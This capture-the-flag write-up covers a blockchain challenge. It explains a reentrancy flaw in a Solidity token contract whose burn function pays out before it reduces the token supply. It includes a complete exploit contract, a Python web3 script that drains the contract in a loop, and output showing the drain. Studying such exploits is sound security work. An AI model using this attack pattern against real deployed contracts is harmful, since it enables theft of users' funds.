# Buy My Coin!

Category: Blockchain

Points: 405

Solves: 44

>The Nullium Protocol has just launched its algorithmic token, $NULL. We believe we have solved the greatest problem in decentralized finance: The Liquidity Trilemma. Nullium isn't just a token; it is a self-stabilizing, mathematically perfect store of value designed to outlast the volatility of the crypto markets. In a world of chaos, Nullium offers order. Our proprietary Elastic Reserve Bonding Curve ensures that every single $NULL token in existence is backed by a calculated fraction of Ethereum. There are no admin keys, no rug pulls, and no human error. Just pure, immutable code governing the future of money.



## Solution

We are given a Setup Contract and a Coin Contract

Setup.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./Coin.sol";

contract Setup {
    Coin public coin;

    constructor() payable {
        require(msg.value == 101 ether, "Setup requires exactly 101 ETH");

        coin = new Coin{value: 1 ether}();
        coin.exchange{value:  100 ether}();
    }

    function isSolved() external view returns (bool) {
        return address(coin).balance < 1 ether;
    }
}
```

Coin.sol:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Coin is ERC20 {
    uint256 public constant INITIAL_RATE = 100; 

    constructor() ERC20("Nullium", "NULL") payable {
        
    }

    function exchange() external payable {
        require(msg.value > 0, "Must send ETH");

        uint256 _totalSupply = totalSupply();
        uint256 amountToMint;

        if (_totalSupply == 0) {
            amountToMint = msg.value * INITIAL_RATE;
        } else {
            uint256 ethReserve = address(this).balance - msg.value;
            amountToMint = (msg.value * _totalSupply) / ethReserve;
        }

        _mint(msg.sender, amountToMint);
    }

    function burn(uint256 amount) external {
        require(balanceOf(msg.sender) >= amount, "Insufficient balance");
        
        uint256 _totalSupply = totalSupply();
        uint256 ethBalance = address(this).balance;

        uint256 ethToReturn = (amount * ethBalance) / _totalSupply;

        require(address(this).balance >= ethToReturn, "Liquidity error");

        (bool success, ) = payable(msg.sender).call{value: ethToReturn}("");
        require(success, "Transfer failed");

        _burn(msg.sender, amount);
    }

    function burnFree(uint256 amount) external {
        require(balanceOf(msg.sender) >= amount, "Insufficient token balance");

        _burn(msg.sender, amount);     
    }
}
```

Intially, the setup contract intializes a coin. Then it creates a supply of `100 ether * 100 INITIAL_RATE` = `10000` coins. The coin contract will also 

Then, we are given 3 methods for the coins. We can use `exchange` to give ether and get back coins at a calculated exchange rate. We can use `burn` to give coins for ether at a calculated exchange rate. Finally we can use `burnFree` to just get rid of coins without getting back any ether. 

One of the first things we can notice is that in the `burn` function we can see that the contract first pays the user first, then reduces the amount of coins the user has.

```solidity
(bool success, ) = payable(msg.sender).call{value: ethToReturn}("");
require(success, "Transfer failed");

_burn(msg.sender, amount);
```

This should then spark us to think about a re-entrancy attack since the user gets payed first, and then their account gets updated. Thus, theoretically, if we called burn again after we get payed and before the Coin contract has time to updated the user tokens using `_burn`, we could then duplicate the amount of `ethToReturn` that the coin contract pays us.

However, there is only one problem with this approach. No matter if we try to re-enter two times or infinite times, eventually we will have to stop the re-entrancy attack. Then when the contract tries to update the amount of tokens the user has in `_burn`. It will over draft the account since it would underflowing below zero. However, since the amount of tokens the user has underflows, then the code will revert all the recursive transactions as it is no longer valid. Thus, we can not this simply re-enter and gain money.

However, while we can not re-enter `burn` by itself, there is still a vulnerability that is caused by giving us money first before updating the amount of coins the user has. This is because the math used to calculate the exchange rate between ether and the tokens is dependent on both how much Ether the `Coin` contract has, as well as the total number of tokens in circulation. Thus, in the time between when `burn` sends us back some ether, and the time when `burn` reduces the supply of tokens, there is a desync between the `ethReserve` and the `_totalSupply` which means that the math to calculate the exchange rate would be incorrect. 

In fact, since after using `burn` the `ethReserve` of the `Coin` contract has gone down, since it gave us some Ether, but the `_totalSupply` of has not gone down since it hasn't updated it with `_burn`, then in the `exchange` function. The calculation of `amountToMint = (msg.value * _totalSupply) / ethReserve;` will be higher than its supposed to be.

Thus the attack sequence becomes clear. We will first spend some Ether to buy some tokens from `Coin`. Then we will use `burn` to convert those tokens back to Ether. Then we will add a fall-back recieve function to then convert this returned ether back to tokens using `exchange` before `_burn` has time to update the total supply. Thus, in the end we will have gained coins in this process due to the favorable exchange rate. Then we will `burn` all these coins again to convert it back to ether. We will then just repeat these steps over and over again until we have the drained the `Coin` contracts wallet.



## Full Exploit Script


#### Exploit.sol:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface ICoin {
    function exchange() external payable;
    function burn(uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}

contract Exploit {
    ICoin public coin;
    bool internal isAttacking;

    constructor(address _coin) {
        coin = ICoin(_coin);
    }

    function start() external payable {
        // Step A: Initial exchange to get some tokens
        coin.exchange{value: msg.value}();

        // Step B: Trigger the reentrancy loop
        // We burn all tokens we have. This sends ETH to us -> triggers receive()
        isAttacking = true;
        uint256 myBalance = coin.balanceOf(address(this));
        coin.burn(myBalance); 
        isAttacking = false;

        // Step C: After reentrancy is done
        // We now burn the newly acquired tokens which is more than we started with
        uint256 newBalance = coin.balanceOf(address(this));
        coin.burn(newBalance);

        // Step D: Send profit back
        payable(msg.sender).transfer(address(this).balance);
    }

    // Fallback to re-enter
    receive() external payable {
        if (isAttacking) {
            // We now call exchange again
            // Since the contract's ETH balance (ethReserve) is low (because it just paid us), 
            // But totalSupply (_totalSupply) is still high (because _burn hasn't happened yet).
            // This gets us more tokens than we are supposed to get: amountToMint = (msg.value * _totalSupply) / ethReserve;
            coin.exchange{value: msg.value}();
        }
    }
}
```

#### exploit.py:

```py
from web3 import Web3
from eth_account import Account
from solcx import compile_standard, install_solc
import os

# CONFIG

RPC_URL = ...
PRIVKEY = ...
SETUP_CONTRACT_ADDR = ...
WALLET_ADDR = ...

# WEB3 SETUP

w3 = Web3(Web3.HTTPProvider(RPC_URL))
acct = Account.from_key(PRIVKEY)

print("[+] Connected to RPC:", w3.is_connected())
print("[+] Loaded attacker wallet:", acct.address)

# COMPILE EXPLOIT CONTRACT

def compile_exploit():
    print("[*] Compiling Exploit.sol...")
    
    install_solc("0.8.20")
    
    current_dir = os.path.abspath(os.path.dirname(__file__))
    node_modules_dir = os.path.join(current_dir, "node_modules")
    
    oz_contracts = os.path.join(node_modules_dir, "@openzeppelin", "contracts")
    if not os.path.exists(oz_contracts):
        raise FileNotFoundError(f"OpenZeppelin contracts not found at {oz_contracts}. Run: npm install @openzeppelin/contracts")
    
    sources = {}
    for filename in ["Coin.sol", "Setup.sol", "Exploit.sol"]:
        with open(filename) as f:
            sources[filename] = {"content": f.read()}
    
    compiled = compile_standard(
        {
            "language": "Solidity",
            "sources": sources,
            "settings": {
                "remappings": [
                    "@openzeppelin/contracts/=node_modules/@openzeppelin/contracts/"
                ],
                "outputSelection": {"*": {"*": ["abi", "evm.bytecode"]}},
            },
        },
        solc_version="0.8.20",
        base_path=current_dir,
        allow_paths=[current_dir, node_modules_dir]
    )
    
    return (
        compiled["contracts"]["Coin.sol"]["Coin"]["abi"],
        compiled["contracts"]["Coin.sol"]["Coin"]["evm"]["bytecode"]["object"],
        compiled["contracts"]["Setup.sol"]["Setup"]["abi"],
        compiled["contracts"]["Setup.sol"]["Setup"]["evm"]["bytecode"]["object"],
        compiled["contracts"]["Exploit.sol"]["Exploit"]["abi"],
        compiled["contracts"]["Exploit.sol"]["Exploit"]["evm"]["bytecode"]["object"],
    )


COIN_ABI, COIN_BIN, SETUP_ABI, SETUP_BIN, EXPLOIT_ABI, EXPLOIT_BIN = compile_exploit()

# Setup and Coin contract instances

setup = w3.eth.contract(address=SETUP_CONTRACT_ADDR, abi=SETUP_ABI)
coin_addr = setup.functions.coin().call()
coin = w3.eth.contract(address=coin_addr, abi=COIN_ABI)

print("[+] Setup contract at:", SETUP_CONTRACT_ADDR)
print("[+] Coin contract at:", coin_addr)


# Helper Functions

def send_tx(tx):
    """Build, sign, and send a transaction."""
    tx['nonce'] = w3.eth.get_transaction_count(acct.address)
    tx['gas'] = tx.get('gas', 300000)
    tx['maxFeePerGas'] = w3.eth.gas_price

    signed = acct.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    #print("[+] Sent TX:", tx_hash.hex())

    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    return receipt

def get_balances():
    """Display current balances for player and casino."""
    eth_bal = w3.from_wei(w3.eth.get_balance(acct.address), 'ether')
    player_coins = coin.functions.balanceOf(acct.address).call()
    coin_bal = w3.from_wei(w3.eth.get_balance(coin_addr), 'ether')
    print(f"[+] Player Balance: {eth_bal} ETH")
    print(f"[+] Player COIN Balance: {player_coins} COIN")
    print(f"[+] COIN Balance: {coin_bal} ETH")

def is_solved():
    """Check if the challenge is solved."""
    solved = setup.functions.isSolved().call()
    print("[+] Challenge solved?", solved)
    return solved


def deploy_exploit():
    exploit = w3.eth.contract(abi=EXPLOIT_ABI, bytecode=EXPLOIT_BIN)
    tx = exploit.constructor(coin_addr).build_transaction({
        'from': acct.address,
    })
    receipt = send_tx(tx)

    global exploit_instance
    exploit_instance = w3.eth.contract(
        address=receipt.contractAddress,
        abi=EXPLOIT_ABI,
    )
    print("[+] Deployed Exploit contract at:", exploit_instance.address)


def attack(value):
    tx = exploit_instance.functions.start().build_transaction({
        'from': acct.address,
        'value': w3.to_wei(value, 'ether'),
        'gas': 1_000_000,
    })
    receipt = send_tx(tx)
    print("Attacking with", value, "ETH")


def balanceOf(address):
    return w3.eth.get_balance(address)

if __name__ == "__main__":
    get_balances()
    deploy_exploit()

    while balanceOf(coin_addr) > w3.to_wei(1, 'ether'):
        attack(w3.from_wei(balanceOf(acct.address)*0.95, 'ether'))

    get_balances()
    is_solved()
```

## Output

```py
[+] Connected to RPC: True
[+] Loaded attacker wallet: 0x90CD81013C7e4D2FE49FC9E4180D52BA64548D6e
[*] Compiling Exploit.sol...
[+] Setup contract at: 0x85Dd063dc84BaC11b58b261279159Cc2586d14c8
[+] Coin contract at: 0x26BE6dCdA4d9599D9ead7c4cf3D208e05e55A42F
[+] Player Balance: 2 ETH
[+] Player COIN Balance: 0 COIN
[+] COIN Balance: 101 ETH
[+] Deployed Exploit contract at: 0xda5CFEd8549d0ff136a1522a2638FAEd71D8FEB1
Attacking with 1.8996148738 ETH
Attacking with 1.932832832007543552 ETH
Attacking with 1.96722589939753344 ETH
Attacking with 2.002857111594720768 ETH
Attacking with 2.039794072770646784 ETH
...
Attacking with 28.136863120830001152 ETH
Attacking with 34.833831714414661632 ETH
Attacking with 44.483609041726111744 ETH
Attacking with 58.31796247425880064 ETH
Attacking with 76.10293805747150848 ETH
Attacking with 91.73125426777022464 ETH
[+] Player Balance: 102.544673576653249701 ETH
[+] Player COIN Balance: 0 COIN
[+] COIN Balance: 0.449336625346750299 ETH
[+] Challenge solved? True
```
